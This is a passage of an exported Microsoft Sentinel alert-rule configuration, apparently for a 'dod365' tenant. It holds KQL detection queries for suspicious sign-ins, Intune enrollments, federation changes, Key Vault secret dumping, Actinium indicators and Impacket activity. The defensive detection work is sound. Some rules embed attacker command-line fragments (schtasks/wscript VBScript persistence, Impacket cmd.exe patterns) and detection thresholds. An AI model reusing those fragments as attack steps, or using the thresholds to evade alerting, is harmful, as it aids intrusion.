asc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration","InitialAccess"],"techniques":["T1078"],"displayName":"BAH_WinRM_EXO_Signin","enabled":true,"description":"This analytic looks for sign-in to Office 365 from WinRM, which is the legacy Office 365 management protocol that has been deprecated in favor of more modern PowerShell modules.\nPLATFORM:Microsoft 365,Azure AD,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.002;T1078.003;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:05:59.8561962Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f21694d8-f381-47ae-a597-88eb39644b2f","name":"f21694d8-f381-47ae-a597-88eb39644b2f","etag":"\"87009fd4-0000-2700-0000-66fdc9b90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\r\n//Description: Looks for Intune enrollments with unapproved platforms during the UEM pilot\r\n//False Positives: None known\r\nlet approved_platforms = dynamic ([\r\n    \"Windows 10\", \"MacOS\", \"OSX\", \"iOS 14\", \"Android\", \"iOS 15\"]);\r\nlet mainTimeFrame = 24h;\r\nlet identitylookupTimeFrame = 90d;\r\nlet main =\r\nSigninLogs\r\n| where TimeGenerated >=ago(mainTimeFrame)\r\n| where AppDisplayName has \"intune\"\r\n| where ConditionalAccessStatus !has \"success\"\r\n| extend Detail = todynamic(DeviceDetail)\r\n| extend detectedOs = parse_json(DeviceDetail).operatingSystem\r\n| where not(detectedOs has_any(approved_platforms))\r\n// | where ConditionalAccessPolicies['result'] == \"failure\" or ConditionalAccessPolicies['result'] == \"success\" or ConditionalAccessStatus == \"notApplied\"\r\n| project\r\n    Time = TimeGenerated,\r\n    OS = Detail['operatingSystem'],\r\n    Operation = OperationName,\r\n    UserId,\r\n    UserPrincipalName,\r\n    ConditionalAccessStatus,\r\n    AppDisplayName,\r\n    CorrelationId,\r\n    ConditionalAccessPolicies\r\n;\r\nlet users = main\r\n| summarize make_set(UserId)\r\n;\r\nmain\r\n| extend test = iif(ConditionalAccessPolicies == \"[]\", ConditionalAccessStatus, parse_json(ConditionalAccessPolicies[0].displayName))\r\n| project-away ConditionalAccessPolicies\r\n| join kind=leftouter (IdentityInfo\r\n| where TimeGenerated >=ago(identitylookupTimeFrame)\r\n| where AccountObjectId in (users)\r\n| summarize max(TimeGenerated), make_set(AccountDisplayName), make_set(AccountUPN), make_set(Department), make_set(JobTitle) by AccountObjectId\r\n| extend AccountDisplayName = set_AccountDisplayName[0], AccountUPN = set_AccountUPN[0], Department = set_Department[0], JobTitle = set_JobTitle[0]\r\n| project-away set_JobTitle, set_Department, set_AccountUPN, set_AccountDisplayName, max_TimeGenerated\r\n| extend JobTitle = iif(AccountUPN contains \"dod365.onmicrosoft\", \"Admin Account\", iif(isempty(JobTitle), \"Not Listed\", JobTitle ))\r\n| extend Department = iif(AccountUPN contains \"dod365.onmicrosoft\", \"Admin Account\", iif(isempty(Department), \"Not Listed\", Department))\r\n) on $left.UserId == $right.AccountObjectId\r\n| project-away UserPrincipalName\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"DisplayName","columnName":"AccountDisplayName"},{"identifier":"FullName","columnName":"AccountUPN"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1200","T1199"],"displayName":"BAH_Intune_Enrollments_with_Unapproved_Platforms","enabled":false,"description":"Looks for Intune enrollments with unapproved platforms during the UEM pilot\nPLATFORM:Microsoft 365,Windows,IaaS\nMITRE:T00001;T1199;T1200","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:31:21.1696079Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/54131129-fb94-457b-8559-89fd2e7ecfa4","name":"54131129-fb94-457b-8559-89fd2e7ecfa4","etag":"\"8700d6d5-0000-2700-0000-66fdc9d10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\r\n//Description: Looks for Intune enrollment activity that occurs outside of standard U.S. work hours, Monday - Friday, 8AM-5PM, Eastern Time.\r\n//False Positives: None known\r\nlet suspectDay = dynamic (['6.00:00:00', '0.00:00:00']); //e.x 0.00:00:00 = Sunday 1.00:00:00 = Monday\r\nlet workdayStart = 13;\r\nlet workdayEnd = 25; //24hr time\r\nlet workdayOverflow = iff(workdayEnd >= 24, workdayEnd-24, 0);\r\nlet mainTimeFrame = 24h;\r\nlet identitylookupTimeFrame = 90d;\r\nlet main =\r\nSigninLogs\r\n| where TimeGenerated >=ago(mainTimeFrame)\r\n| where AppDisplayName has \"intune\"\r\n| extend Detail = todynamic(DeviceDetail)\r\n| extend Day = tostring(dayofweek(TimeGenerated))\r\n| extend Hour = hourofday(TimeGenerated)\r\n| where (Day has_any(suspectDay)) or ((workdayOverflow < Hour and Hour < workdayStart) or (Hour > workdayEnd))\r\n| mv-expand ConditionalAccessPolicies\r\n| where ConditionalAccessPolicies['result'] == \"failure\" or ConditionalAccessPolicies['result'] == \"success\"\r\n| extend ConditionalAccessPolicy = strcat(toupper(ConditionalAccessPolicies['result']), \"----\",  ConditionalAccessPolicies['displayName'])\r\n| project\r\n    Time = TimeGenerated,\r\n    Day,\r\n    Hour,\r\n    OS = Detail['operatingSystem'],\r\n    Operation = OperationName,\r\n    UserId = UserPrincipalName,\r\n    ConditionalAccessPolicy,\r\n    Source = SourceSystem,\r\n    LocationDetails,\r\n    ResultSignature, \r\n    ResultDescription\r\n;\r\nlet users = main\r\n| summarize make_set(UserId);\r\nmain\r\n| join kind=leftouter (IdentityInfo\r\n| where TimeGenerated >=ago(identitylookupTimeFrame)\r\n| where AccountUPN in (users)\r\n| summarize max(TimeGenerated), make_set(AccountDisplayName), make_set(Department), make_set(JobTitle) by AccountUPN\r\n| extend AccountDisplayName = set_AccountDisplayName[0], Department = set_Department[0], JobTitle = set_JobTitle[0]\r\n| project-away set_AccountDisplayName, set_Department, set_JobTitle\r\n)\r\non $left.UserId == $right.AccountUPN\r\n| extend Department = iif(UserId contains \"dod365.onmicrosoft\", \"Admin Account\", iif(isempty(Department), \"Not Listed\", Department))\r\n| extend JobTitle = iif(UserId contains \"dod365.onmicrosoft\", \"Admin Account\", iif(isempty(JobTitle), \"Not Listed\", JobTitle))\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountUPN"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1200","T1199"],"displayName":"BAH_Intune_Enrollment_Attempts_Outside_U.S._Work_Hours","enabled":false,"description":"Looks for Intune enrollment activity that occurs outside of standard U.S. work hours, Monday - Friday, 8AM-5PM, Eastern Time.\nPLATFORM:Microsoft 365,Windows,IaaS\nMITRE:T00001;T1199;T1200","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:31:45.150252Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e7c63123-29d6-4bbe-aa24-3e98c442a49f","name":"e7c63123-29d6-4bbe-aa24-3e98c442a49f","etag":"\"87005bab-0000-2700-0000-66fdc6d20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Matt Schwartz\r\n//Description: Sourced from AuditLogs this analytic is triggered by domain authentication and federation settings being registered against the Azure Active Directory Service for a given tenant.\r\n//False Positives: None known\r\nlet starttime = now(-14d);\r\nlet endtime = now();\r\nlet excludeSync = '06c9ca02-8129-473d-8ae9-f964890b5706';\r\n// Sparrow Operations Types\r\nlet OpsTable = datatable(Category_: string, Operation: string) [\r\n    'Domain_Operations', \"Set domain authentication\",\r\n    'Domain_Operations', \"Set federation settings on domain\",\r\n    'AppUpdate_Operations', \"Update application\",\r\n    'AppUpdate_Operations', \"Update application ? Certificates and secrets management\",\r\n    'ServicePrincipal_Operations', \"Update service principal\",\r\n    'ServicePrincipal_Operations', \"Add service principal\", //added for testing purposes only\r\n    'ServicePrincipal_Operations', \"Add service principal credentials\",\r\n    'AppRoleAssignment_Operations', \"Add app role assignment\",\r\n    'Consent_Operations', \"Add OAuth2PermissionGrant\",\r\n    'Consent_Operations', \"Consent to application\",\r\n    'SAMLToken_Operations', \"UserLoggedIn\",\r\n    'SAMLToken_Operations', \"UserLoginFailed\",\r\n    'PSMailbox_Operations', \"MailboxLogin\",\r\n    'PSLogin_Operations', \"UserLoggedIn\",\r\n    'PSLogin_Operations', \"UserLoginFailed\",\r\n    'MailItemsAccessed_Operations', \"MailItemsAccessed\",\r\n    'FileItems_Operations', \"FileAccessed\",\r\n    'FileItems_Operations', \"FileAccessedExtended\"\r\n];\r\nAuditLogs\r\n| where TimeGenerated between(starttime .. endtime) and InitiatedBy !has excludeSync\r\n| mv-expand TargetResources, AdditionalDetails, InitiatedBy\r\n| extend\r\n    tr = parse_json(TargetResources),\r\n    ad = parse_json(AdditionalDetails),\r\n    ib = parse_json(InitiatedBy)\r\n// | project tr.displayName\r\n| evaluate bag_unpack(tr)\r\n| evaluate bag_unpack(ad)\r\n| evaluate bag_unpack(ib)\r\n| extend id = column_ifexists('id', '')\r\n| extend displayName = column_ifexists('displayName', '')\r\n| extend modifiedProperties = column_ifexists('modifiedProperties', '')\r\n| extend type = column_ifexists('type', '')\r\n| extend app = column_ifexists('app', '')\r\n| extend app = parse_json(app)\r\n| join kind=inner OpsTable on $left.OperationName == $right.Operation\r\n| where Category_ == \"Domain_Operations\"\r\n| extend actor = iif(isnotempty(app.appId), app.appId, app.servicePrincipalId)\r\n| project CreationTime = TimeGenerated, Id, Category, Operation = OperationName, Organization = \"\", RecordType = AADOperationType\r\n    , ResultStatus = Result, LogonError = \"\", UserKey = Identity, UserType = type, Version = OperationVersion\r\n    , Workload = AADTenantId, ClientIP = \"\", ObjectId = ResourceId, UserId = LoggedByService\r\n    , AzureActiveDirectoryEventType = ActivityDisplayName, ExtendedProperties = app, ModifiedProperties = modifiedProperties\r\n    , Actor = actor, ActorContextId = \"\", ActorIpAddress = \"\", InterSystemsId = \"\", IntraSystemId = \"\", SupportTicketId = \"\"\r\n    , Target = displayName, TargetContextId = \"\", AppId = id, ClientAppId = \"\", ClientIPAddress = \"\", ClientInfoString = \"\"\r\n    , ExternalAccess = \"\", InternalLogonType = \"\", LogonType = \"\", MailboxGuid = \"\", MailboxOwnerSid = \"\", MailboxOwnerUPN = \"\"\r\n    , OperationProperties = \"\", OrganizationName = ResourceGroup, OriginatingServer = Resource, Folders = \"\", OperationCount = \"\"\r\n    , LogonUserSid = \"\", ApplicationId = \"\", CorrelationId, EventSource = SourceSystem, ItemType = \"\", ListId = \"\", ListItemUniqueId = \"\"\r\n    , Site = \"\", UserAgent = \"\", WebId = \"\", HighPriorityMediaProcessing = \"\", SourceFileExtension = \"\", SiteUrl = \"\", SourceFileName = \"\"\r\n    , SourceRelativeUrl = \"\"\r\n| sort by CreationTime desc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":true,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"CloudApplication","fieldMappings":[{"identifier":"AppId","columnName":"Id"}]},{"entityType":"DNS","fieldMappings":[{"identifier":"DomainName","columnName":"Target"}]},{"entityType":"SecurityGroup","fieldMappings":[{"identifier":"ObjectGuid","columnName":"ObjectId"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Target"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","PrivilegeEscalation"],"techniques":["T1078","T1556","T1484"],"displayName":"BAH_Sparrow_DomainIAM_Detect_Malicious","enabled":true,"description":"Sourced from AuditLogs this analytic is triggered by domain authentication and federation settings being registered against the Azure Active Directory Service for a given tenant.\nPLATFORM:Microsoft 365,Azure AD,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0003;T1556,TA0004;T1484;T1484.001;T1484.002","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:18:57.6080495Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b2930154-a341-4463-9b4e-217dcd77479a","name":"b2930154-a341-4463-9b4e-217dcd77479a","etag":"\"0200e519-0000-2700-0000-624904f70000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"MicrosoftSecurityIncidentCreation","properties":{"productFilter":"Microsoft Defender Advanced Threat Protection","severitiesFilter":null,"displayNamesFilter":null,"displayNamesExcludeFilter":null,"displayName":"Create incidents based on Microsoft Defender for Endpoint alerts","enabled":false,"description":"Create incidents based on all alerts generated in Microsoft Defender for Endpoint","alertRuleTemplateName":"327cd4ed-ca42-454b-887c-54e1c91363c6","lastModifiedUtc":"2022-04-01T16:00:34.713751Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f6e2dd67-5c8c-4672-9e43-79e75c35c492","name":"f6e2dd67-5c8c-4672-9e43-79e75c35c492","etag":"\"850041e2-0000-2700-0000-66fdac620000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h; // Look back 1 hour for AzureDiagnostics logs\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = ThreatIntelligenceIndicator\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n  | where ipv4_is_private(TI_ipEntity) == false and  TI_ipEntity !startswith \"fe80\" and TI_ipEntity !startswith \"::\" and TI_ipEntity !startswith \"127.\"\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now();\n// Perform a join between IP indicators and AzureDiagnostics logs for Key Vault events\nIP_Indicators\n  // Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n  | join kind=innerunique (\n      AzureDiagnostics\n      | where ResourceType =~ \"VAULTS\"\n      | where TimeGenerated >= ago(dt_lookBack)\n      | extend KeyVaultEvents_TimeGenerated = TimeGenerated, ClientIP = CallerIPAddress\n  )\n  on $left.TI_ipEntity == $right.ClientIP\n  // Filter out logs that occurred after the expiration of the corresponding indicator\n  | where KeyVaultEvents_TimeGenerated < ExpirationDateTime\n  // Group the results by IndicatorId and ClientIP, and keep the log entry with the latest timestamp\n  | summarize KeyVaultEvents_TimeGenerated = arg_max(KeyVaultEvents_TimeGenerated, *) by IndicatorId, ClientIP\n  // Select the desired output fields\n  | project KeyVaultEvents_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\n    TI_ipEntity, ClientIP, ResourceId, SubscriptionId, OperationName, ResultType, CorrelationId, id_s, clientInfo_s, httpStatusCode_d,\n    identity_claim_appid_g, identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, Type\n  // Rename the timestamp field\n  | extend timestamp = KeyVaultEvents_TimeGenerated\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]},{"entityType":"AzureResource","fieldMappings":[{"identifier":"ResourceId","columnName":"ResourceId"}]}],"templateVersion":"1.3.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI map IP entity to Azure Key Vault logs","enabled":true,"description":"Identifies a match in Azure Key Vault logs from any IP IOC from TI\nPLATFORM:IaaS,Windows\nMITRE:TA0001;T1190,TA0040;T1485;T1486","alertRuleTemplateName":"57c7e832-64eb-411f-8928-4133f01f4a25","lastModifiedUtc":"2024-10-02T20:26:09.1872942Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/21400572-95d7-4b65-94d6-86a9873ac850","name":"21400572-95d7-4b65-94d6-86a9873ac850","etag":"\"2f0016fe-0000-2700-0000-649d85360000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let DistinctSecretsThreshold = 10;\nlet EventCountThreshold = 50;\n// To avoid any False Positives, filtering using AppId is recommended.\n// The AppId 509e4652-da8d-478d-a730-e9d4a1996ca4 has been added in the query as it corresponds to Azure Resource Graph performing VaultGet operations for indexing and syncing all tracked resources across Azure.\n// The AppId 8cae6e77-e04e-42ce-b5cb-50d82bce26b1 has been added as it correspond to Microsoft Policy Insights Provider Data Plane performing VaultGet operations for policies checks.\nlet AllowedAppId = dynamic([\"509e4652-da8d-478d-a730-e9d4a1996ca4\",\"8cae6e77-e04e-42ce-b5cb-50d82bce26b1\"]);\nlet OperationList = dynamic([\"SecretGet\", \"KeyGet\", \"VaultGet\"]);\nAzureDiagnostics\n| where OperationName in (OperationList) and ResourceType =~ \"VAULTS\"\n| where not(identity_claim_appid_g in (AllowedAppId) and OperationName == 'VaultGet')\n| extend\n    ResultType = column_ifexists(\"ResultType\", \"\"),\n    identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g = column_ifexists(\"identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g\", \"\"),\n    identity_claim_http_schemas_xmlsoap_org_ws_2005_05_identity_claims_upn_s = column_ifexists(\"identity_claim_http_schemas_xmlsoap_org_ws_2005_05_identity_claims_upn_s\", \"\"),\n    identity_claim_oid_g = column_ifexists(\"identity_claim_oid_g\", \"\"),\n    identity_claim_upn_s = column_ifexists(\"identity_claim_upn_s\", \"\")\n| extend\n    CallerObjectId = iff(isempty(identity_claim_oid_g), identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, identity_claim_oid_g),\n    CallerObjectUPN = iff(isempty(identity_claim_upn_s), identity_claim_http_schemas_xmlsoap_org_ws_2005_05_identity_claims_upn_s, identity_claim_upn_s)\n| as _Retrievals\n| where CallerObjectId in (toscalar(\n    _Retrievals\n    | where ResultType == \"Success\"\n    | summarize Count = dcount(requestUri_s) by OperationName, CallerObjectId\n    | where Count > DistinctSecretsThreshold\n    | summarize make_set(CallerObjectId,10000)\n))\n| extend\n    requestUri_s = column_ifexists(\"requestUri_s\", \"\"),\n    id_s = column_ifexists(\"id_s\", \"\"),\n    CallerIPAddress = column_ifexists(\"CallerIPAddress\", \"\"),\n    clientInfo_s = column_ifexists(\"clientInfo_s\", \"\")\n| summarize\n    EventCount = count(),\n    StartTime = min(TimeGenerated),\n    EndTime = max(TimeGenerated),\n    ResourceList = make_set(Resource, 50),\n    OperationNameList = make_set(OperationName, 50),\n    RequestURLList = make_set(requestUri_s, 50),\n    CallerIPList = make_set(CallerIPAddress, 50),\n    clientInfo_sList = make_set(clientInfo_s, 50),\n    CallerIPMax = max(CallerIPAddress)\n    by ResourceType, ResultType, identity_claim_appid_g, CallerObjectId, CallerObjectUPN\n    | where EventCount > EventCountThreshold\n| project-reorder StartTime, EndTime, EventCount, ResourceType,identity_claim_appid_g, CallerObjectId, CallerObjectUPN, ResultType, ResourceList, OperationNameList, RequestURLList, CallerIPList, clientInfo_sList\n| extend timestamp = EndTime","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"ObjectGuid","columnName":"CallerObjectId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIPMax"}]}],"templateVersion":"1.0.5","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1003"],"displayName":"Mass secret retrieval from Azure Key Vault","enabled":true,"description":"Identifies mass secret retrieval from Azure Key Vault observed by a single user. \nMass secret retrival crossing a certain threshold is an indication of credential dump operations or mis-configured applications. \nYou can tweak the EventCountThreshold based on average count seen in your environment \nand also filter any known sources (IP/Account) and useragent combinations based on historical analysis to further reduce noise","alertRuleTemplateName":"24f8c234-d1ff-40ec-8b73-96b17a3a9c1c","lastModifiedUtc":"2023-06-29T13:20:51.723421Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/2ae8de69-7f72-446d-9144-55d19bf86b02","name":"2ae8de69-7f72-446d-9144-55d19bf86b02","etag":"\"0e009d1c-0000-2700-0000-62716f1c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Identifies a match across various data feeds for domains, hashes and commands related to an actor tracked by Microsoft as Actinium.'\r\n// based on the following analytic, https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/ActiniumFeb2022.yaml\r\nlet iocs = externaldata(DateAdded:string,IoC:string,Type:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/ActiniumIOC.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\r\nlet domains = (iocs | where Type =~ \"domainname\"| project IoC);\r\nlet sha256Hashes = (iocs | where Type =~ \"sha256\" | project IoC);\r\n(union isfuzzy=true\r\n(DeviceProcessEvents\r\n| where InitiatingProcessSHA256 in (sha256Hashes) or SHA256 in (sha256Hashes) or  (ProcessCommandLine has ('schtasks.exe /CREATE /sc minute /mo 12 /tn')  and ProcessCommandLine has ('/tr \"wscript.exe') and ProcessCommandLine has ('\"%PUBLIC%\\\\Pictures\\\\') and ProcessCommandLine has ('//e:VBScript //b\" /F')) or (ProcessCommandLine has ('wscript.exe C:\\\\Users\\\\') and ProcessCommandLine has ('.wav') and  ProcessCommandLine has ('//e:VBScript //b'))\r\n| project TimeGenerated, ActionType, DeviceId, DeviceName, ProcessCommandLine, InitiatingProcessAccountName, InitiatingProcessCommandLine, FolderPath, InitiatingProcessFolderPath, ProcessId, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName,  InitiatingProcessSHA256, Type, AccountName, SHA256, FileName\r\n| extend Account = AccountName, Computer = DeviceName,  FileHash = case(InitiatingProcessSHA256 in (sha256Hashes), \"InitiatingProcessSHA256\", SHA256 in (sha256Hashes), \"SHA256\", \"No Match\")\r\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = FileName, FileHashCustomEntity = case(FileHash == \"InitiatingProcessSHA256\", InitiatingProcessSHA256, FileHash == \"SHA256\", SHA256, \"No Match\")\r\n),\r\n(DeviceNetworkEvents \r\n| where isnotempty(RemoteUrl) \r\n| where RemoteUrl  in~ (domains)  \r\n| project Type, TimeGenerated, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessAccountName\r\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, DNSName = RemoteUrl, IPCustomEntity = RemoteIP\r\n)\r\n)\r\n\r\n\r\n\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"ProcessCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1203"],"displayName":"Actinium","enabled":true,"description":"Identifies a match across various data feeds for domains, hashes and commands related to an actor tracked by Microsoft as Actinium.'","alertRuleTemplateName":null,"lastModifiedUtc":"2022-05-03T18:06:19.9344635Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e26f26c7-789d-4bea-a9a5-0be8cdc25cef","name":"e26f26c7-789d-4bea-a9a5-0be8cdc25cef","etag":"\"47016db1-0000-2700-0000-65aa960c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let commandlineStrings = dynamic(['cmd.exe', '&1','/Q','/c',@'\\\\\\\\127.0.0.1']);\nDeviceEvents\n| where InitiatingProcessCommandLine endswith @'\\wmiprvse.exe' or\nInitiatingProcessCommandLine endswith @'\\mmc.exe' or\nInitiatingProcessCommandLine endswith @'\\explorer.exe' or\nInitiatingProcessCommandLine endswith @'\\services.exe' or\nInitiatingProcessCommandLine endswith @'\\rundll32.exe' or\nInitiatingProcessCommandLine endswith @'\\services.exe' and\nProcessCommandLine has_all (commandlineStrings)\n| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine, AccountName, AccountDomain, DeviceName, DeviceId","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","CredentialAccess","Discovery","Collection"],"techniques":["T1569","T1047","T1557","T1040","T1003","T1558"],"displayName":"BAH_Impacket","enabled":true,"description":"The provided Kusto Query Language (KQL) query is used to look for client behavior related to the Impacket series of Python classes. Impacket is often used by threat actors for lateral movement and execution. The query checks for specific patterns in process command lines, looking for indications that Impacket or similar tools might be in use.                                                                                                                                                                                         